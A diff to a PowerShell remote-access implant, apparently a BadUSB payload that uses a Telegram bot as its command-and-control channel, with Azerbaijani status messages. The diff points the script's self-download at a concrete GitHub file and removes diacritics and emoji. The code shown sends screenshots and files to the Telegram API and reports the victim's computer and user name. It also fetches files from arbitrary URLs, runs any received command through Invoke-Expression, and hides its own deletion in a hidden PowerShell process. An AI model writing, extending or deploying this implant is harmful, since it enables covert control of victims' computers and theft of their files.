@@ -18,7 +18,7 @@ if (-not (Test-Path $hiddenScript)) {
     if ($selfPath -and (Test-Path $selfPath)) {
         Copy-Item -Path $selfPath -Destination $hiddenScript -Force -ErrorAction SilentlyContinue
     } else {
-        $selfUrl = "https://raw.githubusercontent.com/USERNAME/badusb-demo/main/step1.ps1"
+        $selfUrl = "https://raw.githubusercontent.com/rirtuh/badusbdemo/refs/heads/main/system.ps1"
         try {
             Invoke-WebRequest -Uri $selfUrl -OutFile $hiddenScript -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
         } catch {}
@@ -46,7 +46,7 @@ function Send-Message($text) {
 
 # --- Köməkçi: fayl göndər ---
 function Send-File($filePath) {
-    if (-not (Test-Path $filePath)) { Send-Message "Xəta: Fayl tapılmadı — $filePath"; return }
+    if (-not (Test-Path $filePath)) { Send-Message "Xeta: Fayl tapilmadi - $filePath"; return }
     try {
         Add-Type -AssemblyName System.Net.Http
         [byte[]]$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
@@ -60,9 +60,9 @@ function Send-File($filePath) {
         $content.Add($fileContent, "document", $fileName)
         $response = $client.PostAsync("$apiUrl/sendDocument", $content).Result
         $client.Dispose(); $content.Dispose()
-        if ($response.IsSuccessStatusCode) { Send-Message "✅ Fayl göndərildi: $fileName" }
-        else { Send-Message "Xəta: HTTP $($response.StatusCode)" }
-    } catch { Send-Message "Xəta: $_" }
+        if ($response.IsSuccessStatusCode) { Send-Message "Fayl gonderildi: $fileName" }
+        else { Send-Message "Xeta: HTTP $($response.StatusCode)" }
+    } catch { Send-Message "Xeta: $_" }
 }
 
 # --- Köməkçi: ekran şəkli ---
@@ -90,13 +90,13 @@ function Send-Screenshot {
         $content.Add($fileContent, "photo", "ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png")
         $response = $client.PostAsync("$apiUrl/sendPhoto", $content).Result
         $client.Dispose(); $content.Dispose()
-        if ($response.IsSuccessStatusCode) { Send-Message "✅ Ekran şəkli göndərildi" }
-        else { Send-Message "Xəta: HTTP $($response.StatusCode)" }
-    } catch { Send-Message "Xəta: $_" }
+        if ($response.IsSuccessStatusCode) { Send-Message "Ekran sekli gonderildi" }
+        else { Send-Message "Xeta: HTTP $($response.StatusCode)" }
+    } catch { Send-Message "Xeta: $_" }
 }
 
 # --- Başlanğıc mesajı ---
-Send-Message "🟢 C2 başladı: $env:COMPUTERNAME ($env:USERNAME) — $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+Send-Message "C2 basladi: $env:COMPUTERNAME ($env:USERNAME) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
 # --- Əsas dövrə ---
 while ($true) {
@@ -112,20 +112,20 @@ while ($true) {
 
                     if ($cmd -eq "/help" -or $cmd -eq "/start") {
                         Send-Message @"
-🤖 Telegram C2 — Əmrlər:
-/help — bu mesaj
-/ss — ekran şəkli
-/file <path> — qovluqdakı faylları siyahıla
-/get <path> — faylı göndər
-/cd <path> — cari qovluğu dəyiş
-/download <url> <path> — URL-dən fayl yüklə
-/exit — skripti dayandır və sil
-<əmr> — istənilən PowerShell əmri
+Telegram C2 - Emrler:
+/help - bu mesaj
+/ss - ekran sekli
+/file <path> - qovluqdaki fayllari siyahila
+/get <path> - fayli gonder
+/cd <path> - cari qovlugu deyis
+/download <url> <path> - URL-den fayl yukle
+/exit - skripti dayandir ve sil
+<emr> - istenilen PowerShell emri
 "@
                         continue
                     }
 
-                    if ($cmd -eq "/ss") { Send-Message "📸 Ekran şəkli çəkilir..."; Send-Screenshot; continue }
+                    if ($cmd -eq "/ss") { Send-Message "Ekran sekli cekilir..."; Send-Screenshot; continue }
 
                     if ($cmd -like "/file *") {
                         $path = $cmd.Substring(6).Trim()
@@ -133,15 +133,15 @@ while ($true) {
                         if (Test-Path $fullPath) {
                             $items = Get-ChildItem -Path $fullPath -ErrorAction SilentlyContinue
                             if ($items) {
-                                $list = "📁 $fullPath`n`n"
+                                $list = "Qovluq: $fullPath`n`n"
                                 foreach ($item in $items) {
-                                    $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
+                                    $type = if ($item.PSIsContainer) { "[DIR]" } else { "[FILE]" }
                                     $size = if ($item.PSIsContainer) { "" } else { " ($([math]::Round($item.Length/1KB, 2)) KB)" }
                                     $list += "$type $($item.Name)$size`n"
                                 }
                                 Send-Message $list
-                            } else { Send-Message "📁 $fullPath — boşdur" }
-                        } else { Send-Message "Xəta: Qovluq tapılmadı" }
+                            } else { Send-Message "Qovluq: $fullPath - bosdur" }
+                        } else { Send-Message "Xeta: Qovluq tapilmadi" }
                         continue
                     }
 
@@ -158,29 +158,29 @@ while ($true) {
                         if (Test-Path $fullPath -PathType Container) {
                             $script:currentDir = (Resolve-Path $fullPath).Path
                             $items = Get-ChildItem -Path $currentDir -ErrorAction SilentlyContinue
-                            $list = "📂 Cari qovluq: $currentDir`n`n"
+                            $list = "Cari qovluq: $currentDir`n`n"
                             if ($items) {
                                 foreach ($item in $items) {
-                                    $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
+                                    $type = if ($item.PSIsContainer) { "[DIR]" } else { "[FILE]" }
                                     $size = if ($item.PSIsContainer) { "" } else { " ($([math]::Round($item.Length/1KB, 2)) KB)" }
                                     $list += "$type $($item.Name)$size`n"
                                 }
-                            } else { $list += "(boşdur)" }
+                            } else { $list += "(bosdur)" }
                             Send-Message $list
-                        } else { Send-Message "Xəta: Qovluq tapılmadı" }
+                        } else { Send-Message "Xeta: Qovluq tapilmadi" }
                         continue
                     }
 
                     if ($cmd -like "/download *") {
                         $parts = $cmd.Substring(10).Trim() -split '\s+', 2
-                        if ($parts.Count -lt 2) { Send-Message "İstifadə: /download <url> <path>"; continue }
+                        if ($parts.Count -lt 2) { Send-Message "Istifade: /download <url> <path>"; continue }
                         $url = $parts[0]; $savePath = $parts[1]
-                        if ($url -notmatch '^https?://') { Send-Message "Xəta: Yalnız http/https"; continue }
+                        if ($url -notmatch '^https?://') { Send-Message "Xeta: Yalniz http/https"; continue }
                         $fullPath = if ([System.IO.Path]::IsPathRooted($savePath)) { $savePath } else { Join-Path $currentDir $savePath }
                         try {
                             Invoke-WebRequest -Uri $url -OutFile $fullPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
-                            Send-Message "✅ Yükləndi: $fullPath"
-                        } catch { Send-Message "Xəta: $_" }
+                            Send-Message "Yuklendi: $fullPath"
+                        } catch { Send-Message "Xeta: $_" }
                         continue
                     }
 
@@ -191,14 +191,14 @@ while ($true) {
                             $cleanup = "Start-Sleep -Seconds 3; Remove-Item '$self' -Force -ErrorAction SilentlyContinue"
                             Start-Process powershell -ArgumentList "-W Hidden -NoP -Command `"$cleanup`"" -WindowStyle Hidden
                         }
-                        Send-Message "🔴 C2 dayandırılır, startup və skript faylı silinir"
+                        Send-Message "C2 dayandirilir, startup ve skript fayli silinir"
                         exit
                     }
 
                     try {
                         $output = Invoke-Expression $cmd 2>&1 | Out-String
-                        if ([string]::IsNullOrWhiteSpace($output)) { $output = "[Əmr icra olundu, çıxış yoxdur]" }
-                    } catch { $output = "Xəta: $_" }
+                        if ([string]::IsNullOrWhiteSpace($output)) { $output = "[Emr icra olundu, cixis yoxdur]" }
+                    } catch { $output = "Xeta: $_" }
                     Send-Message $output
                 }
             }
